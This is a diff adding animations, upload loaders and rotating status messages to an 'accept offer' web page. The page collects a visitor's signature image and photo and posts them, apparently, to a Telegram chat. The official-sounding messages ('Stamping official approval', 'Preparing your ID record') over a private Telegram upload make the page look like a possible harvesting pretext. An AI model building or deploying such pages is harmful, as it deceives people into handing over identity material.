@@ -53,7 +53,15 @@
 
         .top-bar {
             height: 8px;
-            background: linear-gradient(90deg, var(--primary), #fb7185, var(--gold));
+            background: linear-gradient(90deg, var(--primary), #fb7185, var(--gold), var(--primary));
+            background-size: 200% 100%;
+            animation: gradientFlow 4s ease infinite;
+        }
+
+        @keyframes gradientFlow {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
 
         .content {
@@ -108,6 +116,12 @@
             letter-spacing: 0.5px;
             text-transform: uppercase;
             margin-bottom: 14px;
+            animation: softPulse 2.4s ease-in-out infinite;
+        }
+
+        @keyframes softPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.03); }
         }
 
         .subject {
@@ -160,6 +174,14 @@
             left: 0;
             color: var(--primary);
             font-size: 0.85rem;
+            display: inline-block;
+            animation: heartBeat 1.8s ease-in-out infinite;
+        }
+
+        @keyframes heartBeat {
+            0%, 100% { transform: scale(1); }
+            25% { transform: scale(1.2); }
+            50% { transform: scale(1); }
         }
 
         .signature-section {
@@ -239,6 +261,10 @@
             touch-action: manipulation;
         }
 
+        button:active {
+            transform: scale(0.96);
+        }
+
         .btn-accept {
             background: var(--primary);
             color: white;
@@ -264,7 +290,12 @@
             border: 2px dashed var(--primary);
             border-radius: 14px;
             text-align: center;
-            animation: fadeIn 0.45s ease;
+            animation: stepReveal 0.45s cubic-bezier(0.22, 1, 0.36, 1);
+        }
+
+        @keyframes stepReveal {
+            from { opacity: 0; transform: translateY(16px) scale(0.98); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
         }
 
         .step-box h4 {
@@ -290,12 +321,18 @@
             font-weight: 600;
             font-size: 0.9rem;
             cursor: pointer;
-            transition: 0.2s;
+            transition: all 0.22s ease;
             max-width: 100%;
+            box-shadow: 0 4px 12px rgba(190, 18, 60, 0.08);
         }
 
         .upload-label:hover {
             background: #ffe4e6;
+            transform: translateY(-2px);
+        }
+
+        .upload-label:active {
+            transform: scale(0.97);
         }
 
         input[type="file"] {
@@ -305,6 +342,7 @@
         .preview-box {
             margin-top: 16px;
             display: none;
+            animation: fadeIn 0.35s ease;
         }
 
         .sig-preview-img {
@@ -320,6 +358,7 @@
             box-shadow: 0 6px 16px rgba(0, 0, 0, 0.1);
             margin: 0 auto 14px;
             display: block;
+            animation: floatSlow 3s ease-in-out infinite;
         }
 
         .photo-preview-img {
@@ -331,6 +370,12 @@
             box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
             margin: 0 auto 14px;
             display: block;
+            animation: floatSlow 3s ease-in-out infinite;
+        }
+
+        @keyframes floatSlow {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-4px); }
         }
 
         .btn-submit-step {
@@ -338,11 +383,83 @@
             color: white;
             display: inline-block;
             margin: 0 auto;
+            box-shadow: 0 8px 18px rgba(190, 18, 60, 0.3);
         }
 
         .btn-submit-step:disabled {
             background: #94a3b8;
             cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        /* Animated Uploading Widget */
+        .upload-loader {
+            display: none;
+            margin: 14px auto 4px;
+            max-width: 300px;
+            background: rgba(255, 255, 255, 0.85);
+            border: 1px solid #fecdd3;
+            border-radius: 12px;
+            padding: 12px 14px;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .pulse-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 8px;
+        }
+
+        .pulse-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: var(--primary);
+            position: relative;
+        }
+
+        .pulse-dot::after {
+            content: "";
+            position: absolute;
+            inset: -4px;
+            border-radius: 50%;
+            border: 2px solid var(--primary);
+            animation: rippleRing 1.3s ease-out infinite;
+        }
+
+        @keyframes rippleRing {
+            0% { transform: scale(0.8); opacity: 0.9; }
+            100% { transform: scale(1.9); opacity: 0; }
+        }
+
+        .loader-text {
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: var(--primary-dark);
+        }
+
+        .progress-track {
+            width: 100%;
+            height: 6px;
+            background: #ffe4e6;
+            border-radius: 999px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 45%;
+            background: linear-gradient(90deg, var(--primary), #fb7185, var(--gold));
+            border-radius: 999px;
+            animation: progressSweep 1.6s ease-in-out infinite;
+        }
+
+        @keyframes progressSweep {
+            0% { transform: translateX(-100%); width: 55%; }
+            50% { transform: translateX(45%); width: 70%; }
+            100% { transform: translateX(180%); width: 55%; }
         }
 
         .inline-status {
@@ -362,7 +479,12 @@
             border-radius: 14px;
             text-align: center;
             color: #065f46;
-            animation: fadeIn 0.5s ease;
+            animation: popSuccess 0.55s cubic-bezier(0.22, 1, 0.36, 1);
+        }
+
+        @keyframes popSuccess {
+            from { opacity: 0; transform: scale(0.92); }
+            to { opacity: 1; transform: scale(1); }
         }
 
         .final-success img {
@@ -373,6 +495,7 @@
             border: 3px solid #10b981;
             margin: 0 auto 12px;
             display: block;
+            box-shadow: 0 8px 18px rgba(16, 185, 129, 0.25);
         }
 
         @keyframes fadeIn {
@@ -516,6 +639,17 @@
             <div class="preview-box" id="sigPreviewContainer">
                 <img id="sigPreview" class="sig-preview-img" src="" alt="Signature Preview">
                 <button class="btn-submit-step" id="submitSigBtn" onclick="sendSignatureToTelegram()">Submit Signature & Continue ➔</button>
+
+                <div class="upload-loader" id="sigLoader">
+                    <div class="pulse-row">
+                        <span class="pulse-dot"></span>
+                        <span class="loader-text" id="sigLoaderText">Uploading your signature...</span>
+                    </div>
+                    <div class="progress-track">
+                        <div class="progress-fill"></div>
+                    </div>
+                </div>
+
                 <div class="inline-status" id="sigStatus"></div>
             </div>
         </div>
@@ -531,6 +665,17 @@
             <div class="preview-box" id="photoPreviewContainer">
                 <img id="photoPreview" class="photo-preview-img" src="" alt="Photo Preview">
                 <button class="btn-submit-step" id="submitPhotoBtn" onclick="sendPhotoToTelegram()">Submit for Documentation ✔</button>
+
+                <div class="upload-loader" id="photoLoader">
+                    <div class="pulse-row">
+                        <span class="pulse-dot"></span>
+                        <span class="loader-text" id="photoLoaderText">Sending your photo to HQ...</span>
+                    </div>
+                    <div class="progress-track">
+                        <div class="progress-fill"></div>
+                    </div>
+                </div>
+
                 <div class="inline-status" id="photoStatus"></div>
             </div>
         </div>
@@ -552,6 +697,16 @@
 
     let selectedSignatureFile = null;
     let selectedPhotoFile = null;
+
+    function startEngagingMessages(textElId, messages) {
+        const el = document.getElementById(textElId);
+        let idx = 0;
+        el.innerText = messages[0];
+        return setInterval(() => {
+            idx = (idx + 1) % messages.length;
+            el.innerText = messages[idx];
+        }, 1800);
+    }
 
     function acceptOffer() {
         document.getElementById('actionArea').style.display = 'none';
@@ -590,9 +745,18 @@
 
         const btn = document.getElementById('submitSigBtn');
         const statusEl = document.getElementById('sigStatus');
+        const loaderEl = document.getElementById('sigLoader');
+
         btn.disabled = true;
         btn.innerText = "Uploading Signature...";
         statusEl.innerText = "";
+        loaderEl.style.display = "block";
+
+        const msgTimer = startEngagingMessages("sigLoaderText", [
+            "Uploading your signature...",
+            "Stamping official approval...",
+            "Almost done, hang tight..."
+        ]);
 
         const formData = new FormData();
         formData.append("chat_id", CHAT_ID);
@@ -606,6 +770,8 @@
             });
 
             const data = await response.json().catch(() => ({}));
+            clearInterval(msgTimer);
+            loaderEl.style.display = "none";
 
             if (response.ok && data.ok) {
                 document.getElementById('sigSection').style.display = 'none';
@@ -616,6 +782,8 @@
                 btn.innerText = "Submit Signature & Continue ➔";
             }
         } catch (error) {
+            clearInterval(msgTimer);
+            loaderEl.style.display = "none";
             statusEl.innerText = "Connection interrupted. Tap submit again.";
             btn.disabled = false;
             btn.innerText = "Submit Signature & Continue ➔";
@@ -643,9 +811,18 @@
 
         const submitBtn = document.getElementById('submitPhotoBtn');
         const statusEl = document.getElementById('photoStatus');
+        const loaderEl = document.getElementById('photoLoader');
+
         submitBtn.disabled = true;
         submitBtn.innerText = "Uploading to HQ...";
         statusEl.innerText = "";
+        loaderEl.style.display = "block";
+
+        const msgTimer = startEngagingMessages("photoLoaderText", [
+            "Sending your photo to HQ...",
+            "Preparing your ID record...",
+            "Finalizing your welcome..."
+        ]);
 
         const formData = new FormData();
         formData.append("chat_id", CHAT_ID);
@@ -659,6 +836,8 @@
             });
 
             const data = await response.json().catch(() => ({}));
+            clearInterval(msgTimer);
+            loaderEl.style.display = "none";
 
             if (response.ok && data.ok) {
                 document.getElementById('photoSection').style.display = 'none';
@@ -674,6 +853,8 @@
                 submitBtn.innerText = "Submit for Documentation ✔";
             }
         } catch (error) {
+            clearInterval(msgTimer);
+            loaderEl.style.display = "none";
             statusEl.innerText = "Connection interrupted. Tap submit again.";
             submitBtn.disabled = false;
             submitBtn.innerText = "Submit for Documentation ✔";
